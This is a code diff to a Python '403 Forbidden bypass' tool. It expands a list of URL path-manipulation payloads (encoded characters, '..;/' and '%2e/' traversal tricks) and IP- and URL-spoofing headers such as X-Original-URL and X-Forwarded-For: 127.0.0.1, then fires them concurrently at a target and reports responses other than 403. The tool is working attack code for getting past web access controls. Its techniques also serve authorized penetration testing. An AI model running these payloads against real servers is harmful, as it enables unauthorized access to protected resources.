@@ -22,117 +22,97 @@ DEFAULT_HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 }
 
-# Path bypass patterns
+# Path bypass patterns - RAW patterns to be formatted later with the actual path
 PATH_BYPASS_PATTERNS = [
-    # Original techniques
-    "{path}",
-    "{path}/.",
-    "{path}%20",
-    "{path}%09",
-    "{path}?",
-    "{path}.html",
-    "{path}/?anything",
-    "{path}#",
-    "{path}/*",
-    "{path}.php",
-    "{path}.json",
-    "{path}..;/",
-    "{path};/",
-    "%2e/{path}",
-    "%2f{path}",
-    "../{path}",
+    # Standard techniques
+    "{0}",
+    "%2e/{0}",
+    "{0}/.",
+    "//{0}//",
+    "./{0}/./",
+    "{0}%20",
+    "{0}%09",
+    "{0}?",
+    "{0}.html",
+    "{0}/?anything",
+    "{0}#",
+    "{0}/*",
+    "{0}.php",
+    "{0}.json",
+    "{0}..;/",
+    "{0};/",
     
-    # URL Quirks
-    "//{path}//",
-    "///{path}///",
-    "./{path}/./",
-    "{path}//",
-    "{path}/?",
-    "{path}??",
-    "{path}/?/",
-    "{path}/??",
-    "{path}/??/",
-    "{path}/..",
-    "{path}/../",
-    "{path}/./",
-    "{path}/.",
-    "{path}/.//",
-    "{path}/*",
-    "{path}//*",
-    "{path}/%2f",
-    "{path}/%2f/",
-    
-    # URL Encoding Tricks
-    "{path}/%20",
-    "{path}/%20/",
-    "{path}/%09",
-    "{path}/%09/",
-    "{path}/%0a",
-    "{path}/%0a/",
-    "{path}/%0d",
-    "{path}/%0d/",
-    "{path}/%25",
-    "{path}/%25/",
-    "{path}/%23",
-    "{path}/%23/",
-    "{path}/%26",
-    "{path}/%3f",
-    "{path}/%3f/",
-    "{path}/%26/",
-    
-    # Fragment and Special Characters
-    "{path}/#",
-    "{path}/#/",
-    "{path}/#/./",
-    "./{path}",
-    "./{path}/",
-    "..;/{path}",
-    "..;/{path}/",
-    ".;/{path}",
-    ".;/{path}/",
-    ";/{path}",
-    ";/{path}/",
-    "/;//{path}",
-    "/;//{path}/",
-    
-    # Advanced Path Manipulations
-    "{path}/./",
-    "%2e/{path}",
-    "%2e/{path}/",
-    "%20/{path}/%20",
-    "%20/{path}/%20/",
-    "{path}/..;/",
-    "{path}.json",
-    "{path}/.json",
-    "{path}..;/",
-    "{path};/",
-    "{path}%00",
-    "{path}.css",
-    "{path}.html",
-    "{path}?id=1",
-    "{path}~",
-    "{path}/~",
-    "{path}/°/",
-    "{path}/&",
-    "{path}/-",
-    "{path}\\/\\/",
-    "{path}/..%3B/",
-    "{path}/;%2f..%2f..%2f",
-    
-    # Case Manipulations
-    "{PATH}",
-    "{PATH}/",
-    "{path}/..\;/",
-    "*//{path}",
-    "*//{path}/",
-    "{path}+{path}",
-    "{path}+{path}/"
+    # More techniques from the list
+    "{0}/?",
+    "{0}//",
+    "///{0}///",
+    "{0}??",
+    "{0}/?/",
+    "{0}/??",
+    "{0}/??/",
+    "{0}/..",
+    "{0}/../",
+    "{0}/./",
+    "{0}/.",
+    "{0}/.//",
+    "{0}/*",
+    "{0}//*",
+    "{0}/%2f",
+    "{0}/%2f/",
+    "{0}/%20",
+    "{0}/%20/",
+    "{0}/%09",
+    "{0}/%09/",
+    "{0}/%0a",
+    "{0}/%0a/",
+    "{0}/%0d",
+    "{0}/%0d/",
+    "{0}/%25",
+    "{0}/%25/",
+    "{0}/%23",
+    "{0}/%23/",
+    "{0}/%26",
+    "{0}/%3f",
+    "{0}/%3f/",
+    "{0}/%26/",
+    "{0}/#",
+    "{0}/#/",
+    "{0}/#/./",
+    "./{0}",
+    "./{0}/",
+    "..;/{0}",
+    "..;/{0}/",
+    ".;/{0}",
+    ".;/{0}/",
+    ";/{0}",
+    ";/{0}/",
+    "/;//{0}",
+    "/;//{0}/",
+    "%2f{0}",
+    "../{0}",
+    "/%2e/{0}",
+    "/..;/{0}",
+    "/{0}/..",
+    "/./{0}/.",
+    "/{0}/.;/",
+    "{0}/.json",
+    "{0}%00",
+    "{0}.css",
+    "{0}?id=1",
+    "{0}~",
+    "{0}/~",
+    "{0}/°/",
+    "{0}/&",
+    "{0}/-",
+    "{0}\\/\\/",
+    "{0}/..%3B/",
+    "{0}/;%2f..%2f..%2f",
 ]
 
 # Header bypass techniques
 HEADER_BYPASS = {
-    "X-Original-URL": "{path}",
-    "X-Rewrite-URL": "{path}",
+    "X-Original-URL": "{0}",
+    "X-Rewrite-URL": "{0}",
     "X-Custom-IP-Authorization": "127.0.0.1",
     "X-Forwarded-For": "127.0.0.1",
     "X-Forwarded-Host": "127.0.0.1",
@@ -146,8 +126,6 @@ HEADER_BYPASS = {
     "Client-IP": "127.0.0.1",
     "X-Real-IP": "127.0.0.1",
     "Forwarded": "for=127.0.0.1",
-    "X-Forwarded-For": "localhost",
-    "X-Forwarded-For": "spoofed.com",
     "Referer": "{base_url}",
     "X-Api-Version": "1",
     "Content-Length": "0",
@@ -221,14 +199,25 @@ def extract_base_and_path(url):
     
     return base_url, path
 
-def print_result(test_identifier, status_code, size, base_url, path="", use_color=True):
+def print_result(test_identifier, status_code, size, base_url, test_path="", pattern="", use_color=True, response_sizes=None):
     """Display formatted results highlighting responses different from 403."""
-    display_path = path if path else test_identifier
-    url = f"{base_url}/{display_path}"
+    url = f"{base_url}/{test_path}" if test_path else base_url
     
-    # Don't display too many failed attempts to keep output cleaner
-    if status_code == 403 and random.random() > 0.2:  # Only show ~20% of 403 responses
+    # Skip 403 responses entirely
+    if status_code == 403:
         return status_code, size, url
+    
+    # Track response sizes to detect potential false positives
+    if response_sizes is not None and status_code == 200:
+        if size in response_sizes:
+            response_sizes[size] += 1
+        else:
+            response_sizes[size] = 1
+        
+        # If we've seen this exact response size more than 3 times, 
+        # it's likely a false positive (e.g., generic redirect page)
+        if response_sizes[size] > 3:
+            return status_code, size, url
     
     if use_color:
         if status_code == 403:
@@ -256,17 +245,19 @@ def print_result(test_identifier, status_code, size, base_url, path="", use_colo
             print(f"    URL: {color}{url}{Style.RESET_ALL}")
             print(f"    Status: {status_text}")
             print(f"    Size: {size} bytes")
-            print(f"    Technique: {test_identifier}")
+            print(f"    Technique: {pattern if pattern else test_identifier}")
         else:
-            print(f"{color}[-] {url} --> {status_text}, {size} bytes{Style.RESET_ALL}")
+            # Don't print 403 responses at all
+            pass
     else:
-        print(f"{url} --> {status_code}, {size} bytes")
+        if status_code != 403:  # Don't print 403 responses
+            print(f"{url} --> {status_code}, {size} bytes")
     
     return status_code, size, url
 
 def check_wayback(base_url, path, use_color=True):
     """Query Wayback Machine to check if URL has been archived."""
-    print("\n" + ("-" * 60))
+    print("\n" + ("=" * 80))
     print("Checking Wayback Machine archives...")
     wayback_url = f"https://archive.org/wayback/available?url={base_url}/{path}"
     
@@ -313,11 +304,11 @@ def print_banner():
     ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
     ┃                                                             ┃
     ┃   ██╗  ██╗ ██████╗ ██████╗     ██████╗ ██╗   ██╗██████╗    ┃
-    ┃   ██║  ██║██╔═████╗╚════██╗    ██╔══██╗╚██╗ ██╔╝██╔══██╗   ┃
-    ┃   ███████║██║██╔██║ █████╔╝    ██████╔╝ ╚████╔╝ ██████╔╝   ┃
-    ┃   ╚════██║████╔╝██║██╔═══╝     ██╔══██╗  ╚██╔╝  ██╔═══╝    ┃
-    ┃        ██║╚██████╔╝███████╗    ██████╔╝   ██║   ██║        ┃
-    ┃        ╚═╝ ╚═════╝ ╚══════╝    ╚═════╝    ╚═╝   ╚═╝        ┃
+    ┃   ██║  ██║██╔═══██╗██╔═══██╗   ██╔══██╗╚██╗ ██╔╝██╔══██╗   ┃
+    ┃   ███████║██║██╗██║██║   ██║   ██████╔╝ ╚████╔╝ ██████╔╝   ┃
+    ┃   ╚════██║████╔╝██║██║   ██║   ██╔══██╗  ╚██╔╝  ██╔═══╝    ┃
+    ┃        ██║╚██████╔╝╚██████╔╝   ██████╔╝   ██║   ██║        ┃
+    ┃        ╚═╝ ╚═════╝  ╚═════╝    ╚═════╝    ╚═╝   ╚═╝        ┃
     ┃                                                             ┃
     ┃                  403 FORBIDDEN BYPASS TOOL                  ┃
     ┃                                                             ┃
@@ -365,6 +356,9 @@ def run_bypass(base_url, path, args):
     if status_code != 403:
         print(f"{Fore.YELLOW}[!] Note: Target is not returning 403 Forbidden (got {status_code}). Running tests anyway...{Style.RESET_ALL}\n")
     
+    # Track response sizes to detect potential false positives
+    response_sizes = {}
+    
     # Add another small delay before starting tests
     time.sleep(0.5)
     
@@ -373,16 +367,22 @@ def run_bypass(base_url, path, args):
 
     # Create list of path tests
     for pattern in PATH_BYPASS_PATTERNS:
-        test_path = pattern.format(path=path)
-        bypass_tests.append(("PATH", test_path))
+        test_path = pattern.format(path)
+        bypass_tests.append(("PATH", test_path, pattern))
+        
+        # Add uppercase version
+        upper_path = path.upper()
+        if upper_path != path:  # Only if there's a difference
+            test_path_upper = pattern.format(upper_path)
+            bypass_tests.append(("PATH", test_path_upper, pattern + " (uppercase)"))
 
     # Create list of header tests
     for header, value in HEADER_BYPASS.items():
         headers = DEFAULT_HEADERS.copy()
-        if "{path}" in value:
-            headers[header] = value.format(path=path)
+        if "{0}" in value:
+            headers[header] = value.format(path)
         elif "{base_url}" in value:
-            headers[header] = value.format(base_url=base_url)
+            headers[header] = value.replace("{base_url}", base_url)
         else:
             headers[header] = value
         bypass_tests.append(("HEADER", path, header, headers))
@@ -404,11 +404,11 @@ def run_bypass(base_url, path, args):
         future_to_test = {}
 
         # Submit path tests
-        for bypass_type, test_path in [t for t in bypass_tests if t[0] == "PATH"]:
+        for bypass_type, test_path, pattern in [t for t in bypass_tests if t[0] == "PATH"]:
             future = executor.submit(
                 request_url, base_url, test_path, timeout=args.timeout, verbose=args.verbose
             )
-            future_to_test[future] = (bypass_type, test_path)
+            future_to_test[future] = (bypass_type, test_path, pattern)
 
         # Submit header tests
         for bypass_type, path, header, headers in [t for t in bypass_tests if t[0] == "HEADER"]:
@@ -439,11 +439,17 @@ def run_bypass(base_url, path, args):
                 
                 if status_code is not None:
                     if bypass_type == "PATH":
-                        result = print_result(params[0], status_code, size, base_url, use_color=not args.no_color)
+                        test_path, pattern = params
+                        result = print_result(pattern, status_code, size, base_url, test_path, pattern, 
+                                            use_color=not args.no_color, response_sizes=response_sizes)
                     elif bypass_type in ["HEADER", "USER_AGENT"]:
-                        result = print_result(f"{params[0]} ({params[1]})", status_code, size, base_url, use_color=not args.no_color)
+                        path, identifier = params[0], params[1]
+                        result = print_result(f"{identifier}", status_code, size, base_url, path, f"{identifier}", 
+                                            use_color=not args.no_color, response_sizes=response_sizes)
                     elif bypass_type == "METHOD":
-                        result = print_result(f"{params[0]} ({params[1]})", status_code, size, base_url, use_color=not args.no_color)
+                        path, method = params
+                        result = print_result(f"{method}", status_code, size, base_url, path, f"{method}", 
+                                            use_color=not args.no_color, response_sizes=response_sizes)
                     
                     # Save successful bypasses (non-403 responses)
                     if status_code != 403:
@@ -455,9 +461,18 @@ def run_bypass(base_url, path, args):
     if not args.no_wayback:
         check_wayback(base_url, path, use_color=not args.no_color)
     
-    # Display summary
-    print("\n" + ("-" * 60))
+    # Add intelligence about potential false positives based on response size patterns
+    if response_sizes:
+        most_common_size = max(response_sizes.items(), key=lambda x: x[1])
+        if most_common_size[1] > 10:  # If we see the same size more than 10 times
+            print(f"\n{Fore.YELLOW}[!] Warning: Many responses ({most_common_size[1]}) have the same size ({most_common_size[0]} bytes).{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}    This may indicate false positives due to a generic response page.{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}    Consider manually verifying any bypasses with this response size.{Style.RESET_ALL}")
+    
+    # Display summary 
+    print("\n" + ("=" * 80))
     print(f"Summary: {len(successful_results)} successful bypass attempts out of {len(bypass_tests)} tests")
+    print("=" * 80)
     
     # Save results if output file specified
     if args.output and successful_results:
